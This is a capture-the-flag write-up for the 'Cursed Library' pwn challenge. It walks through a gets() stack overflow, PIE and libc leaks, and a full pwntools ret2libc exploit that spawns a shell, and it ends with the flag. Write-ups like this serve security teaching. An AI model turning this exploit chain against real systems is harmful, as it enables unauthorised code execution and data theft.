# Cursed Library

> **Category:** Binary Exploitation (Pwn) · **Points:** 235 · **Track:** [Pwn](README.md)

## Objective

A 64-bit Linux ELF binary ("Cursed Library") simulates a library menu where the player can peruse, checkout, or leave. The goal is to read a protected file, `Necronomicon.txt`, which the program explicitly refuses to open through its normal menu.

## Step 1: Static triage

The binary was checked for its protections before doing anything else:

```bash
file Cursed_Library
checksec --file=Cursed_Library
```

```
PIE:           Enabled
NX:            Enabled
RELRO:         Partial
Stack Canary:  None
```

No stack canary meant a classic stack buffer overflow was in play. PIE being enabled meant addresses would need to be leaked at runtime rather than hard-coded.

## Step 2: Finding the vulnerability

Disassembling the `checkout()` function with `objdump` showed it reads the book name with an unbounded `gets()` call into a fixed-size stack buffer, a textbook stack overflow. Further inspection of the strings and symbols in the binary revealed a hidden/undocumented function, `Necronomicon()`, as well as a secret bypass string, `"BookOfTheDead"`, that the program's `checkout()` function accepts to print a leak of its own address via `printf("%p")`. This self-leak is the first building block of a PIE bypass.

## Step 3: Building the exploit

Using pwntools, the exploit chain was built in three stages:

1. **Leak the PIE base** by sending the `"BookOfTheDead"` string and reading back the self-referential pointer leaked by the function.
2. **Leak libc** by overflowing the stack buffer with a ROP chain that calls `puts()` on a known GOT/PLT entry, then returns back into `checkout()` (re-entering the function directly, rather than returning into `main()`'s input loop, avoids corrupting the saved `rbp` that `main()` relies on for its own stack-relative addressing).
3. **Get a shell with a ret2libc chain:** `pop rdi; ret` → address of `"/bin/sh"` → `system()`, with one extra bare `ret` gadget inserted beforehand to satisfy x86-64's 16-byte stack alignment requirement before entering `system()`.

```python
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

elf = ELF('./Cursed_Library', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
io = remote(HOST, PORT)
OFFSET = 104

def goto_checkout():
    io.recvuntil(b'>'); io.sendline(b'2'); io.recvuntil(b'open?')

# Stage 1: leak PIE base
goto_checkout()
io.sendline(b'BookOfTheDead')
io.recvuntil(b'make out: ')
pie_base = int(io.recvline(), 16) - elf.symbols['BookOfTheDead']

# Stage 2: leak libc base via puts()
goto_checkout()
necro_addr = pie_base + elf.symbols['Necronomicon']
checkout_addr = pie_base + elf.symbols['checkout']
io.sendline(b'A' * OFFSET + p64(necro_addr) + p64(checkout_addr))
io.recvuntil(b'puts(): ')
libc_base = int(io.recvline(), 16) - libc.symbols['puts']
io.recvuntil(b'open?')

# Stage 3: ret2system
pop_rdi = libc_base + next(libc.search(asm('pop rdi; ret')))
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
system = libc_base + libc.symbols['system']
ret_gadget = pie_base + 0x1ba0  # stack-alignment fixup

io.sendline(b'A' * OFFSET + p64(ret_gadget) + p64(pop_rdi) + p64(binsh) + p64(system))
io.interactive()  # $ cat Necronomicon.txt
```

## Flag

```
deadface{T#3_L1br4ry_Kn0w5_A11}
```

---
[← Back to index](../../README.md)
